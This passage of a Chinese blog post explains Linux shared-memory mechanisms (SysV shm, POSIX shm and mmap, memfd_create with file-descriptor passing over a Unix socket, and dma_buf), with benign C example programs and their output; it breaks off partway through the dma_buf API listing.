              <time title="Created: 2022-11-23 23:22:17 / Modified: 23:23:30" itemprop="dateCreated datePublished" datetime="2022-11-23T23:22:17+08:00">2022-11-23</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.4k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>SYStemV 共享内存</strong></p>
<p>传统的 SYStemV 共享内存是指 <code>shm</code> 那一伙 API：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">size_t</span> size, <span class="keyword">int</span> shmflg)</span></span>; <span class="comment">/* 获取一个新的共享内存段 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">shmat</span><span class="params">(<span class="keyword">int</span> shmid, <span class="keyword">const</span> <span class="keyword">void</span> *shmaddr, <span class="keyword">int</span> shmflg)</span></span>; <span class="comment">/* 进行内存映射 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmdt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *shmaddr)</span></span>; <span class="comment">/* 删除内存映射 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmctl</span><span class="params">(<span class="keyword">int</span> shmid, <span class="keyword">int</span> cmd, struct shmid_ds *buf)</span></span>; <span class="comment">/* 对共享内存段进行操作 */</span></span><br></pre></td></tr></table></figure>
<p>在早期版本的内核中，“共享内存”，“信号量”，“消息队列” 都使用通用的 <code>ipcget</code> 函数完成创建，只是 <code>ipc_ops</code> 结构体的初始化不同</p>
<p>其实 <code>do_shmat</code> 底层申请内存的部分和 <code>mmap</code> 一样，都是调用 <code>do_mmap_pgoff</code>，效果就是映射一片由 VMA 组织起来的共享内存段</p>
<p>之后的 <code>shmget</code> 通过相同的 <code>key</code>，就可以获取同一片共享内存区域</p>
<p><strong>POSIX 共享内存</strong></p>
<p>传统的 SYStemV shm 共享内存有个升级版的 POSIX API：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shm_open</span><span class="params">(struct vm_area_struct *vma)</span></span>; <span class="comment">/* 在/dev/shm/下建立一个文件,作为该进程的共享内存 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shm_close</span><span class="params">(struct vm_area_struct *vma)</span></span>; <span class="comment">/* 释放目标共享内存 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shm_destroy</span><span class="params">(struct ipc_namespace *ns, struct shmid_kernel *shp)</span></span>; <span class="comment">/* 销毁/dev/shm/中对应的文件 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>/dev/shm/</code> 是一个使用就是 tmpfs 文件系统的设备，可以理解为只存在于内存上的文件</li>
</ul>
<p>还有个更经典的 POSIX API 就是 mmap：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>mmap 需要和磁盘进行交互（非匿名映射），导致效率没有 shm 好，但它能够存储的空间更大</li>
</ul>
<p><strong>memfd_create 共享内存</strong></p>
<p>函数 <code>memfd_create</code> 可以创建一个“虚拟文件”，它映射到一片物理内存而不是磁盘</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">memfd_create</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>创建基于 <code>tmpfs</code> 的匿名文件（返回文件描述符）</li>
</ul>
<p>函数 <code>memfd_create</code> 本身并没有共享内存的能力，但是通过之前的 FD 转移技术可以实现共享内存（把 <code>memfd_create</code> 生成的 FD 转移到其他进程中，就实现共享内存了）</p>
<p>使用案例如下：</p>
<ul>
<li>发送共享内存句柄：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/memfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> handle_error(msg) do &#123; perror(msg); exit(EXIT_FAILURE); &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">send_fd</span><span class="params">(<span class="keyword">int</span> socket, <span class="keyword">int</span> *fd, <span class="keyword">int</span> n)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span> *<span class="title">cmsg</span>;</span></span><br><span class="line">        <span class="keyword">char</span> buf[CMSG_SPACE(n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>))], dup[<span class="number">256</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">io</span> =</span> &#123; .iov_base = &amp;dup, .iov_len = <span class="keyword">sizeof</span>(dup) &#125;;</span><br><span class="line"></span><br><span class="line">        msg.msg_iov = &amp;io;</span><br><span class="line">        msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line">        msg.msg_control = buf;</span><br><span class="line">        msg.msg_controllen = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line">        cmsg = CMSG_FIRSTHDR(&amp;msg);</span><br><span class="line">        cmsg-&gt;cmsg_level = SOL_SOCKET;</span><br><span class="line">        cmsg-&gt;cmsg_type = SCM_RIGHTS;</span><br><span class="line">        cmsg-&gt;cmsg_len = CMSG_LEN(n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span> ((<span class="keyword">int</span> *) CMSG_DATA(cmsg), fd, n * <span class="keyword">sizeof</span> (<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sendmsg (socket, &amp;msg, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to send message&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sfd, fd;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line">        <span class="keyword">char</span> *buffer;</span><br><span class="line"></span><br><span class="line">        srand((<span class="keyword">unsigned</span> <span class="keyword">int</span>)time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">        sfd = socket(AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (sfd == <span class="number">-1</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to create socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_un));</span><br><span class="line">        addr.sun_family = AF_UNIX;</span><br><span class="line">        <span class="built_in">strncpy</span>(addr.sun_path, <span class="string">&quot;/tmp/fd-pass.socket&quot;</span>, <span class="keyword">sizeof</span>(addr.sun_path) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        fd = syscall(__NR_memfd_create,<span class="string">&quot;shm&quot;</span>,MFD_CLOEXEC);</span><br><span class="line">        ftruncate(fd,<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to open file 1 for reading&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">fprintf</span> (<span class="built_in">stdout</span>, <span class="string">&quot;Opened fd %d in parent\n&quot;</span>, fd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (connect(sfd, (struct sockaddr *) &amp;addr, <span class="keyword">sizeof</span>(struct sockaddr_un)) == <span class="number">-1</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to connect to socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">        send_fd (sfd, &amp;fd, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        buffer = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>,<span class="number">0x30</span>,PROT_WRITE|PROT_READ,MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(buffer == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                perror(<span class="string">&quot;[mmap error]&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">int</span> t=(<span class="keyword">int</span>)(rand()%<span class="number">1000</span>)/<span class="number">100</span>;</span><br><span class="line">                <span class="built_in">sprintf</span>(buffer,<span class="string">&quot;yhellow: %d&quot;</span>,t);</span><br><span class="line">                sleep(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>接收共享内存句柄：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> handle_error(msg) do &#123; perror(msg); exit(EXIT_FAILURE); &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> * <span class="title">recv_fd</span><span class="params">(<span class="keyword">int</span> socket, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> *fds = <span class="built_in">malloc</span> (n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span> *<span class="title">cmsg</span>;</span></span><br><span class="line">        <span class="keyword">char</span> buf[CMSG_SPACE(n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>))], dup[<span class="number">256</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">io</span> =</span> &#123; .iov_base = &amp;dup, .iov_len = <span class="keyword">sizeof</span>(dup) &#125;;</span><br><span class="line"></span><br><span class="line">        msg.msg_iov = &amp;io;</span><br><span class="line">        msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line">        msg.msg_control = buf;</span><br><span class="line">        msg.msg_controllen = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (recvmsg (socket, &amp;msg, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to receive message&quot;</span>);</span><br><span class="line"></span><br><span class="line">        cmsg = CMSG_FIRSTHDR(&amp;msg);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span> (fds, (<span class="keyword">int</span> *) CMSG_DATA(cmsg), n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> fds;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">ssize_t</span> nbytes;</span><br><span class="line">        <span class="keyword">char</span> *buffer;</span><br><span class="line">        <span class="keyword">int</span> sfd, cfd, *fdp;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line"></span><br><span class="line">        sfd = socket(AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (sfd == <span class="number">-1</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to create socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unlink (<span class="string">&quot;/tmp/fd-pass.socket&quot;</span>) == <span class="number">-1</span> &amp;&amp; errno != ENOENT)</span><br><span class="line">                handle_error (<span class="string">&quot;Removing socket file failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_un));</span><br><span class="line">        addr.sun_family = AF_UNIX;</span><br><span class="line">        <span class="built_in">strncpy</span>(addr.sun_path, <span class="string">&quot;/tmp/fd-pass.socket&quot;</span>, <span class="keyword">sizeof</span>(addr.sun_path) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bind(sfd, (struct sockaddr *) &amp;addr, <span class="keyword">sizeof</span>(struct sockaddr_un)) == <span class="number">-1</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to bind to socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (listen(sfd, <span class="number">5</span>) == <span class="number">-1</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to listen on socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">        cfd = accept(sfd, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (cfd == <span class="number">-1</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to accept incoming connection&quot;</span>);</span><br><span class="line"></span><br><span class="line">        fdp = recv_fd (cfd, <span class="number">1</span>);</span><br><span class="line">        buffer = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>,<span class="number">0x30</span>,PROT_WRITE|PROT_READ,MAP_SHARED,*fdp,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">fprintf</span> (<span class="built_in">stdout</span>, <span class="string">&quot;Reading from passed fd %d\n&quot;</span>, *fdp);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buffer);</span><br><span class="line">                sleep(<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (close(cfd) == <span class="number">-1</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to close client socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./send </span><br><span class="line">Opened fd <span class="number">4</span> in parent</span><br><span class="line">➜  <span class="built_in">exp</span> ./read </span><br><span class="line">Reading from passed fd <span class="number">5</span></span><br><span class="line">yhellow: <span class="number">4</span></span><br><span class="line">Reading from passed fd <span class="number">5</span></span><br><span class="line">yhellow: <span class="number">0</span></span><br><span class="line">Reading from passed fd <span class="number">5</span></span><br><span class="line">yhellow: <span class="number">5</span></span><br><span class="line">Reading from passed fd <span class="number">5</span></span><br><span class="line">yhellow: <span class="number">4</span></span><br><span class="line">Reading from passed fd <span class="number">5</span></span><br><span class="line">yhellow: <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_56145255/article/details/124792742">共享内存技术之memfd_create</a> </p>
<p><strong>dma_buf 共享内存</strong></p>
<p>dma_buf 可以实现 <code>buffer</code> 在多个设备的共享，如果设备驱动想要共享 DMA 缓冲区，可以让一个驱动来导出，一个驱动来使用：</p>
<ul>
<li>可以把一片底层驱动 A 的 buffer 导出到用户空间成为一个 fd</li>
<li>也可以把 fd 导入到底层驱动 B</li>
<li>如果进行 <code>mmap</code> 得到虚拟地址，CPU 也是可以在用户空间访问到已经获得用户空间虚拟地址的底层 buffer 的</li>
</ul>
<p>类似于消费者生产者模型，Linux DMA-BUF 就是基于这种方式来实现的</p>
<p>dma_buf 在内核中的结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_buf</span> &#123;</span></span><br><span class="line">	<span class="keyword">size_t</span> size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">attachments</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dma_buf_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">lock</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> vmapping_counter;</span><br><span class="line">	<span class="keyword">void</span> *vmap_ptr;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *exp_name;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list_node</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *priv;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">reservation_object</span> *<span class="title">resv</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* poll support */</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> poll;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dma_buf_poll_cb_t</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">dma_fence_cb</span> <span class="title">cb</span>;</span></span><br><span class="line">		<span class="keyword">wait_queue_head_t</span> *poll;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">__poll_t</span> active;</span><br><span class="line">	&#125; cb_excl, cb_shared;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当用户 <code>call VIDIOC_EXPBUF</code> 这个 <code>IOCTL</code> 的时候，可以把 dma_buf 转化为 fd：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, VIDIOC_EXPBUF, struct v4l2_exportbuffer *argp)</span></span>;</span><br></pre></td></tr></table></figure>
<p>想要把 dma_buf 的导入侧设备驱动，则会用到如下这些API： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 导出缓冲 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dma_buf_export(priv, ops, size, flags)                  \</span></span><br><span class="line"><span class="meta">    dma_buf_export_named(priv, ops, size, flags, __FILE__)</span></span><br><span class="line"><span class="function">struct dma_buf *<span class="title">dma_buf_export_named</span><span class="params">(<span class="keyword">void</span> *priv, struct dma_buf_ops *ops,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     <span class="keyword">const</span> <span class="keyword">char</span> *exp_name)</span></span>; </span><br><span class="line"><span class="comment">/* 获取文件描述符 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dma_buf_fd</span><span class="params">(struct dma_buf *dmabuf, <span class="keyword">int</span> flags)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* 连接缓冲 */</span></span><br><span class="line"><span class="function">struct dma_buf *<span class="title">dma_buf_get</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br><span class="line"><span class="function">struct dma_buf_attachment *<span class="title">dma_buf_attach</span><span class="params">(struct dma_buf *dmabuf,</span></span></span><br><span class="line"><span class="params"><span class="function">                                          struct device *dev)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* 申请访问 */</span></span><br><span class="line"><span class="function">struct sg_table * <span class="title">dma_buf_map_attachment</span><span class="params">(struct dma_buf_attachment *,</span></span></span><br><span class="line"><span class="params"><span class="function">                                         <span class="keyword">enum</span> 